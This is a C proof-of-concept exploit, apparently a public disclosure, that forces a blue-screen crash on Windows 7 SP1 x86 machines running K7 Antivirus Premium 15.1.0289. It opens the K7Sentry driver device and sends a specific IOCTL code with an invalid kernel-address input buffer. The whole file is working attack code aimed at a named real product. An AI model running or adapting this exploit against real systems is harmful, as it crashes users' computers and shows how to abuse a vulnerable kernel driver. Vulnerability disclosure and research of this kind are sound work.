/**
* Author: bee13oy
* BSoD on Windows 7 SP1 x86 + K7 Antivirus Premium 15.1.0289
**/

#include <Windows.h>

HANDLE OpenDevice(const char* szDeviceName) {
	CHAR szOpenDeviceName[0x200] = "";
	sprintf(szOpenDeviceName, "\\\\.\\%s", szDeviceName);
	HANDLE hDevice = CreateFileA(szOpenDeviceName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);

	if(hDevice == INVALID_HANDLE_VALUE) {
		hDevice = CreateFileA(szOpenDeviceName, 
			GENERIC_READ, 
			0, 
			NULL, 
			OPEN_EXISTING, 
			0, 
			NULL
			);
	}
	return hDevice;
}

void BSoD(const char* szDeviceName)
{
	HANDLE hFile = OpenDevice(szDeviceName);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD nbBytes = 0;
		static CHAR bufOutput[0x1000+1] = "\x00"; 
		DeviceIoControl(
			hFile,
			0x95002867, 
			(LPVOID)0xffff0000, 
			0x00000312, 
			bufOutput,
			0x00000559, 
			&nbBytes, 
			NULL
			);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	BSoD("K7Sentry");

	return 0;
}
